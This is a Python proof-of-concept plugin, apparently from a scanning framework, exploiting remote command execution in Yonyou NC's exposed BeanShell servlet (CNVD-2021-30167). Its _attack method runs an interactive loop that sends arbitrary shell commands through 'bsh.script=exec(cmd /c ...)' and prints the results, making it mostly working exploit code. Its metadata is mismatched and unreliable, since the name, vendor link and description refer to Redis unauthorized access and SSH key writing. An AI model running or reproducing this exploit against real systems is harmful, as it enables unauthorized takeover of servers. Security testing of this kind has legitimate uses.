#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from urllib.parse import quote
import sys
from newpoc.api import re, requests, PocBase, Output
from newpoc.cli import POC_QUEUE

class POC(PocBase):
    cnvd_cve = 'CNVD-2021-30167'  # 漏洞编号
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者名字
    vulDate = '2021-05-27'  # 漏洞公开的时间
    createDate = '2022-08-28'  # 编写 PoC 的日期
    updateDate = '2022-08-29'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源
    name = '用友NC远程命令执行'  # PoC 名称
    appPowerLink = 'https://redis.io/'  # 漏洞厂商主页地址
    appName = 'Redis'  # 漏洞应用名称
    appVersion = 'NC v6.5'  # 漏洞影响版本
    vulType = 'RCE'  # 漏洞类型
    desc = '''
        Redis默认情况下会绑定在0.0.0.0:6379，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
        攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。
        *1
        $4
        info
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/NC/nc_rec.py"
    output = Output()

    def _verify(self, ip=None):
        result = POC.parse_output()
        self.output.check('正在检测漏洞是否存在\n' )
        url = ip['url'] + '/servlet/~ic/bsh.servlet.BshServlet'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'BeanShell' in response.text:
                self.output.success('nc_rce:{} is vulnerable '.format(url))
                result['target-url'] = url
                POC_QUEUE.put(result)
            else:
                self.output.fail('nc_rce:{} is not vulnerable '.format(url))
        except Exception as err:
            self.output.fail('tongda_verify:{0} is fail {1}'.format(ip['url'], err))

    def _attack(self, url=None):
        print("[*]在command后输入执行命令, 仅适用于Windoes, Linux请手动测试\n")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        while True:
            command = str(input('command: '))
            data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command.replace('\\', '\\\\')), 'utf-8')
            try:
                response = requests.post(url, headers=headers, data=data)
                pattern = re.compile('<pre>(.*?)</pre>', re.S)
                result = re.search(pattern, response.text)
                print(result[0].replace('<pre>', '').replace('</pre>', ''))
            except:
                print('[-]未知错误\n')
                sys.exit(0)

    def _shell(self):
        pass

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


